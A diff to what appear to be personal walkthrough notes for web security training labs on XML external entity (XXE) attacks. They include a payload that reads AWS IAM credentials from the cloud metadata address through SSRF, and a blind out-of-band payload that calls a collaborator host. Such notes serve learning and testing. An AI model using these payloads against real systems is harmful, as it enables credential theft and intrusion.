@@ -9,7 +9,17 @@
 #2 Lab: Exploiting XXE to perform SSRF attacks
 
     1. Check stock and send the request to repeater.
-    2. Add <!DOCTYPE foo[<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+    2. Add <!DOCTYPE foo[<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>              (this ip is magic ip for AWS)
     3. Replace the value of productID with &xxe; and send the request.
 
 --------------------------------------------------------------------------------------------------- 
+
+#3 Lab: Blind XXE with out-of-band interaction 
+
+     1. Check stock and send the request to repeater.
+     2. Go to collaborator and copy the payload URL.
+     3. Add <!DOCTYPE test [<!ENTITY xxe SYSTEM "http://3swgluxzdiw0eeskwuu03raj0a61urig.oastify.com">]> after xml line
+     4. Replace the value of productID with &xxe; and send the request.
+     5. Check collaborator for the interaction.
+
+---------------------------------------------------------------------------------------------------
